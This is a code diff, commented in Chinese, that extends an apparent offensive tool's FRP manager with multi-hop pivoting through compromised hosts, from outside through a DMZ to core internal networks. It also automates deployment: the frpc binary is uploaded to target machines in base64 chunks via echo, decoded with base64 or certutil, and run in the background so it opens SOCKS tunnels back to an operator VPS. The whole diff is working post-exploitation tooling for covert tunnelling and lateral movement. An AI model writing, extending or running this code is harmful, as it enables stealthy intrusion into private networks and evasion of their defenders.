@@ -356,6 +356,453 @@ tasklist | findstr frpc
             "total_hops": len(hops)
         }
 
+    # =========================================================================
+    # 多跳代理增强（新增功能）
+    # =========================================================================
+
+    def setup_multi_hop_proxy(self, hop_chain: List[Dict]) -> Dict:
+        """
+        设置多跳代理链
+
+        Args:
+            hop_chain: 跳板链列表，每项包含:
+                {
+                    "host": "主机IP",
+                    "system_type": "linux/windows",
+                    "vps_ip": "VPS IP（可选）",
+                    "vps_port": 7000,
+                    "local_socks_port": 1080
+                }
+
+        Returns:
+            代理链配置和命令
+        """
+        if len(hop_chain) < 1:
+            return {"error": "跳板链为空", "success": False}
+
+        chain_config = []
+        current_vps_port = 7000
+        current_remote_port = 10800
+
+        for i, hop in enumerate(hop_chain):
+            hop_config = self._setup_single_hop(
+                hop=hop,
+                hop_index=i,
+                vps_port=current_vps_port,
+                remote_port=current_remote_port
+            )
+
+            chain_config.append(hop_config)
+
+            # 下一跳使用当前跳的端口
+            current_vps_port = hop.get("vps_port", current_vps_port)
+            current_remote_port += 1
+
+        # 生成proxychains配置
+        proxychains_conf = self._generate_multi_hop_proxychains(chain_config)
+
+        return {
+            "success": True,
+            "chain": chain_config,
+            "total_hops": len(hop_chain),
+            "proxychains_config": proxychains_conf,
+            "final_socks_address": f"{hop_chain[-1].get('vps_ip', self.DEFAULT_VPS_IP)}:{10800 + len(hop_chain) - 1}"
+        }
+
+    def _setup_single_hop(self, hop: Dict, hop_index: int,
+                          vps_port: int, remote_port: int) -> Dict:
+        """设置单跳代理"""
+        system_type = hop.get("system_type", "linux")
+        vps_ip = hop.get("vps_ip", self.DEFAULT_VPS_IP)
+
+        # 生成配置
+        config = self._generate_config(
+            vps_ip=vps_ip,
+            vps_port=vps_port,
+            remote_port=remote_port
+        )
+
+        # 生成上传命令
+        upload_cmds = self._generate_upload_commands(
+            frp_binary=self.FRP_DIR / ("frpc" if system_type == "linux" else "frpc.exe"),
+            config_content=config,
+            system_type=system_type
+        )
+
+        # 生成启动命令
+        start_cmd = self._generate_start_command(system_type)
+
+        return {
+            "hop_index": hop_index + 1,
+            "host": hop.get("host", "unknown"),
+            "system_type": system_type,
+            "vps_ip": vps_ip,
+            "vps_port": vps_port,
+            "remote_port": remote_port,
+            "config": config,
+            "upload_commands": upload_cmds,
+            "start_command": start_cmd,
+            "socks_address": f"{vps_ip}:{remote_port}"
+        }
+
+    def _generate_multi_hop_proxychains(self, chain: List[Dict]) -> str:
+        """生成多跳proxychains配置"""
+        lines = ["# Multi-hop proxy chain configuration"]
+
+        for hop in chain:
+            socks_addr = hop.get("socks_address", "")
+            if socks_addr:
+                lines.append(f"socks5 {socks_addr}")
+
+        return "\n".join(lines)
+
+    def generate_nested_tunnel_commands(self, pivot_hosts: List[Dict]) -> Dict:
+        """
+        生成嵌套隧道命令
+
+        用于多层内网环境：外网 -> DMZ -> 内网 -> 核心网络
+
+        Args:
+            pivot_hosts: 跳板主机列表，按顺序排列
+
+        Returns:
+            完整的嵌套隧道配置
+        """
+        if not pivot_hosts:
+            return {"error": "跳板主机列表为空"}
+
+        nested_config = {
+            "layers": [],
+            "total_layers": len(pivot_hosts),
+            "commands": []
+        }
+
+        for i, pivot in enumerate(pivot_hosts):
+            layer = {
+                "layer": i + 1,
+                "pivot_host": pivot.get("host"),
+                "pivot_os": pivot.get("os_type", "linux"),
+                "upstream_proxy": None,
+                "local_port": 10800 + i
+            }
+
+            # 设置上游代理（如果有）
+            if i > 0:
+                prev_layer = nested_config["layers"][i - 1]
+                layer["upstream_proxy"] = prev_layer["local_port"]
+
+            # 生成该层的代理命令
+            proxy_cmd = self._generate_layer_proxy_command(layer, pivot)
+            nested_config["commands"].append(proxy_cmd)
+
+            nested_config["layers"].append(layer)
+
+        # 生成最终的proxychains配置
+        final_conf = self._generate_nested_proxychains_conf(nested_config)
+        nested_config["final_proxychains"] = final_conf
+
+        return nested_config
+
+    def _generate_layer_proxy_command(self, layer: Dict, pivot: Dict) -> Dict:
+        """生成单层代理命令"""
+        system_type = layer["pivot_os"]
+
+        # 基础配置
+        config = {
+            "serverAddr": pivot.get("vps_ip", self.DEFAULT_VPS_IP),
+            "serverPort": 7000 + layer["layer"] - 1,
+            "localPort": layer["local_port"],
+            "remotePort": layer["local_port"]
+        }
+
+        # 如果有上游代理，需要通过上游连接
+        if layer["upstream_proxy"]:
+            config["via_proxy"] = f"socks5://127.0.0.1:{layer['upstream_proxy']}"
+
+        return {
+            "layer": layer["layer"],
+            "config": config,
+            "commands": self._generate_start_command(system_type)
+        }
+
+    def _generate_nested_proxychains_conf(self, nested_config: Dict) -> str:
+        """生成嵌套proxychains配置"""
+        lines = ["# Nested tunnel proxychains configuration"]
+
+        for layer in reversed(nested_config["layers"]):
+            # 从最内层到最外层
+            lines.append(f"# Layer {layer['layer']}: {layer['pivot_host']}")
+            lines.append(f"socks5 127.0.0.1 {layer['local_port']}")
+
+        return "\n".join(lines)
+
+    def check_proxy_chain_health(self, chain: List[Dict]) -> Dict:
+        """
+        检查代理链健康状态
+
+        Args:
+            chain: 代理链配置
+
+        Returns:
+            各跳的状态
+        """
+        import socket
+
+        health_status = {
+            "healthy": True,
+            "hops": []
+        }
+
+        for hop in chain:
+            host = hop.get("vps_ip", "")
+            port = hop.get("remote_port", 0)
+
+            if host and port:
+                try:
+                    # 尝试连接
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    result = sock.connect_ex((host, port))
+                    sock.close()
+
+                    is_healthy = result == 0
+                    health_status["hops"].append({
+                        "hop": hop.get("hop_index", 0),
+                        "address": f"{host}:{port}",
+                        "healthy": is_healthy
+                    })
+
+                    if not is_healthy:
+                        health_status["healthy"] = False
+
+                except Exception as e:
+                    health_status["hops"].append({
+                        "hop": hop.get("hop_index", 0),
+                        "address": f"{host}:{port}",
+                        "healthy": False,
+                        "error": str(e)
+                    })
+                    health_status["healthy"] = False
+
+        return health_status
+
+    # =========================================================================
+    # 自动部署方法（全自动化功能）
+    # =========================================================================
+
+    def auto_deploy_proxy(self, params: Dict, session_executor=None) -> Dict:
+        """
+        自动部署代理（全自动化）
+
+        Args:
+            params: 代理参数，包含：
+                - vps_ip: VPS IP
+                - vps_port: VPS端口
+                - remote_port: 远程SOCKS端口
+                - system_type: linux/windows
+                - target_host: 目标主机
+                - upload_path: 上传路径（可选）
+            session_executor: 会话执行器（用于执行命令）
+
+        Returns:
+            部署结果
+        """
+        vps_ip = params.get("vps_ip", self.DEFAULT_VPS_IP)
+        vps_port = params.get("vps_port", self.DEFAULT_VPS_PORT)
+        remote_port = params.get("remote_port", 10800)
+        system_type = params.get("system_type", "linux")
+        target_host = params.get("target_host", "")
+        upload_path = params.get("upload_path", "/tmp" if system_type == "linux" else "C:\\temp")
+
+        if vps_ip == "YOUR_VPS_IP":
+            return {
+                "error": "请配置VPS IP地址",
+                "success": False,
+                "hint": "在环境变量 FRP_VPS_IP 或配置文件中设置"
+            }
+
+        # 步骤1: 生成配置
+        setup_result = self._setup_proxy(params)
+        if not setup_result.get("success"):
+            return setup_result
+
+        # 步骤2: 如果有会话执行器，自动执行上传和启动
+        if session_executor:
+            return self._auto_execute_deployment(
+                setup_result,
+                session_executor,
+                system_type,
+                upload_path
+            )
+
+        # 没有执行器，返回手动执行指令
+        return {
+            "success": True,
+            "mode": "manual",
+            "setup": setup_result,
+            "message": "已生成部署配置，需要手动执行上传命令"
+        }
+
+    def _auto_execute_deployment(self, setup_result: Dict, executor,
+                                  system_type: str, upload_path: str) -> Dict:
+        """自动执行部署"""
+        import time
+
+        results = {
+            "steps": [],
+            "success": True
+        }
+
+        # 获取二进制和配置
+        frp_binary = self.FRP_DIR / ("frpc" if system_type == "linux" else "frpc.exe")
+        config_content = setup_result.get("config_content", "")
+
+        # 步骤1: 创建目录
+        if system_type == "linux":
+            mkdir_cmd = f"mkdir -p {upload_path}"
+        else:
+            mkdir_cmd = f"mkdir {upload_path}"
+
+        results["steps"].append({
+            "step": "mkdir",
+            "command": mkdir_cmd,
+            "result": executor.execute(mkdir_cmd)
+        })
+
+        # 步骤2: 上传二进制文件（分块base64）
+        try:
+            with open(frp_binary, "rb") as f:
+                binary_data = f.read()
+
+            binary_b64 = base64.b64encode(binary_data).decode()
+            chunk_size = 8000  # 避免命令行长度限制
+
+            # 分块上传
+            for i in range(0, len(binary_b64), chunk_size):
+                chunk = binary_b64[i:i+chunk_size]
+                if system_type == "linux":
+                    upload_cmd = f"echo '{chunk}' >> {upload_path}/frpc.b64"
+                else:
+                    upload_cmd = f"echo {chunk} >> {upload_path}\\frpc.b64"
+
+                executor.execute(upload_cmd)
+
+            # 解码
+            if system_type == "linux":
+                decode_cmd = f"base64 -d {upload_path}/frpc.b64 > {upload_path}/frpc && chmod +x {upload_path}/frpc"
+            else:
+                decode_cmd = f"certutil -decode {upload_path}\\frpc.b64 {upload_path}\\frpc.exe"
+
+            results["steps"].append({
+                "step": "upload_binary",
+                "chunks": (len(binary_b64) + chunk_size - 1) // chunk_size,
+                "result": executor.execute(decode_cmd)
+            })
+
+        except Exception as e:
+            results["steps"].append({
+                "step": "upload_binary",
+                "error": str(e)
+            })
+            results["success"] = False
+            return results
+
+        # 步骤3: 上传配置文件
+        config_b64 = base64.b64encode(config_content.encode()).decode()
+        if system_type == "linux":
+            config_cmd = f"echo '{config_b64}' | base64 -d > {upload_path}/frpc.toml"
+        else:
+            config_cmd = f"echo {config_b64} | certutil -decode - {upload_path}\\frpc.toml"
+
+        results["steps"].append({
+            "step": "upload_config",
+            "result": executor.execute(config_cmd)
+        })
+
+        # 步骤4: 启动代理
+        if system_type == "linux":
+            start_cmd = f"cd {upload_path} && nohup ./frpc -c frpc.toml > /dev/null 2>&1 &"
+        else:
+            start_cmd = f"cd {upload_path} && start /B frpc.exe -c frpc.toml"
+
+        results["steps"].append({
+            "step": "start_proxy",
+            "result": executor.execute(start_cmd)
+        })
+
+        # 步骤5: 验证
+        time.sleep(2)
+
+        if system_type == "linux":
+            check_cmd = "ps aux | grep frpc | grep -v grep"
+        else:
+            check_cmd = "tasklist | findstr frpc"
+
+        check_result = executor.execute(check_cmd)
+        results["steps"].append({
+            "step": "verify",
+            "running": "frpc" in str(check_result),
+            "result": check_result
+        })
+
+        results["proxy_info"] = setup_result.get("proxy_info", {})
+        results["message"] = "代理部署完成" if results["success"] else "代理部署失败"
+
+        return results
+
+    def auto_deploy_multi_hop(self, hop_chain: List[Dict], session_executors: Dict) -> Dict:
+        """
+        自动部署多跳代理链
+
+        Args:
+            hop_chain: 跳板链配置列表
+            session_executors: {host: executor} 映射
+
+        Returns:
+            部署结果
+        """
+        if len(hop_chain) < 1:
+            return {"error": "跳板链为空", "success": False}
+
+        results = {
+            "hops": [],
+            "success": True,
+            "final_socks": None
+        }
+
+        for i, hop in enumerate(hop_chain):
+            host = hop.get("host", "")
+            executor = session_executors.get(host)
+
+            if not executor:
+                results["hops"].append({
+                    "hop": i + 1,
+                    "host": host,
+                    "error": "无可用执行器",
+                    "success": False
+                })
+                results["success"] = False
+                continue
+
+            # 部署该跳
+            deploy_result = self.auto_deploy_proxy(hop, executor)
+
+            results["hops"].append({
+                "hop": i + 1,
+                "host": host,
+                "result": deploy_result
+            })
+
+            if not deploy_result.get("success"):
+                results["success"] = False
+
+        # 设置最终代理地址
+        if results["success"] and hop_chain:
+            last_hop = hop_chain[-1]
+            results["final_socks"] = f"{last_hop.get('vps_ip', self.DEFAULT_VPS_IP)}:{last_hop.get('remote_port', 10800)}"
+
+        return results
+
 
 def setup_single_proxy(vps_ip: str, vps_port: int = 7000,
                         remote_port: int = 10800,
@@ -385,3 +832,83 @@ def register():
     """注册frp管理器"""
     from tool_framework import ToolRegistry
     ToolRegistry.register(FRPManager())
+
+
+# =========================================================================
+# 多跳代理便捷函数
+# =========================================================================
+
+def setup_multi_hop_proxy_chain(hop_hosts: List[Dict]) -> Dict:
+    """
+    快速设置多跳代理链
+
+    Args:
+        hop_hosts: 跳板主机列表
+
+    Returns:
+        代理链配置
+    """
+    manager = FRPManager()
+    return manager.setup_multi_hop_proxy(hop_hosts)
+
+
+def check_proxy_health(vps_ip: str, socks_port: int) -> bool:
+    """
+    检查单个代理健康状态
+
+    Args:
+        vps_ip: VPS IP
+        socks_port: SOCKS端口
+
+    Returns:
+        是否健康
+    """
+    import socket
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        result = sock.connect_ex((vps_ip, socks_port))
+        sock.close()
+        return result == 0
+    except:
+        return False
+
+
+# =========================================================================
+# 自动部署便捷函数
+# =========================================================================
+
+def auto_setup_proxy(vps_ip: str, vps_port: int = 7000,
+                      remote_port: int = 10800,
+                      system_type: str = "linux",
+                      session_executor=None) -> Dict:
+    """
+    自动设置代理
+
+    Args:
+        vps_ip: VPS IP地址
+        vps_port: frps端口
+        remote_port: SOCKS5端口
+        system_type: linux/windows
+        session_executor: 会话执行器（可选）
+
+    Returns:
+        部署结果
+    """
+    manager = FRPManager()
+    params = {
+        "vps_ip": vps_ip,
+        "vps_port": vps_port,
+        "remote_port": remote_port,
+        "system_type": system_type
+    }
+    return manager.auto_deploy_proxy(params, session_executor)
+
+
+def get_vps_config_from_env() -> Dict:
+    """从环境变量获取VPS配置"""
+    return {
+        "vps_ip": os.environ.get("FRP_VPS_IP", "YOUR_VPS_IP"),
+        "vps_port": int(os.environ.get("FRP_VPS_PORT", "7000")),
+        "remote_port": int(os.environ.get("FRP_REMOTE_PORT", "10800"))
+    }
